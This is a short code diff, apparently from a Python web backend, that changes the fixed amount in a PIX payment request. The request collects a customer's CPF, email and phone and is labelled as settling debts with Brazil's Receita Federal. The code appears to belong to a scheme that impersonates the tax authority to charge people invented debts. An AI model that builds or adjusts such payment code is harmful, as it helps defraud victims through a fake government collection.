@@ -154,7 +154,7 @@ def generate_pix():
             'email': customer_email,
             'cpf': customer_data['cpf'],
             'phone': customer_data.get('phone', '11999999999'),
-            'amount': 138.42,  # Valor fixo da dívida
+            'amount': 68.47,  # Valor fixo da dívida
             'description': 'Regularização de Débitos - Receita Federal',
             'expirationMinutes': 60
         }
